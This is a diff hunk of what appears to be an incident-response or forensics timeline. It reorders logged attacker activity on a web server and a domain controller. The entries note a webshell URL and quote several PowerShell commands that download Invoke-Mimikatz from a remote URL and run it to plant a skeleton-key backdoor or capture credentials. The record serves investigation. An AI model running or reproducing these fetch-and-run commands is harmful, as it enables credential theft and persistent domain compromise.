@@ -55,14 +55,14 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 * 04/Aug/2020:23:07:16, use tunnel request ```http://192.168.1.3/umbraco/bbbb.aspx``` it's webshell
 
 # dc server
-* 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```
-
-* 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```
-
-* 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```
-
-* 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```
-
 * 2020/08/04:09:23:44, invoke Mimikatz via ```cmd.exe /Q /c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" 1> \\127.0.0.1\ADMIN$\__1596450222.629457 2>&1``` by ```WIN-LN8SES7K1Q5$```
+
+* 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```
+
+* 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```
+
+* 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```
+
+* 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```
 
 * 2020/08/05:22:25:34, exec ipconfig.exe by ```TEAMT5\Administrator```
